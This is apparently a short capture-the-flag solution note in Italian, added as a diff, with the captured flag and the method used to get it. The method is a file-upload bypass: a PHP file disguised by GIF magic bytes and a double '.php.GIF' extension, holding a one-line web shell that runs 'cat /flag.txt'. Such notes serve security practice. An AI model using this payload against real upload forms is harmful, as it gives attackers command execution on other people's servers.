@@ -1,0 +1,8 @@
+flag{D0ubl3_ex7eN5i0nS_Ru1n3D_my_d4y!} 
+
+fare un file su vs code dove si scrive queso codice php con sopra i byte del formato gif
+
+GIF89a;
+<?php echo system("cat /flag.txt"); ?>
+
+salvare il file come nome_file.php.GIF  e caricarlo
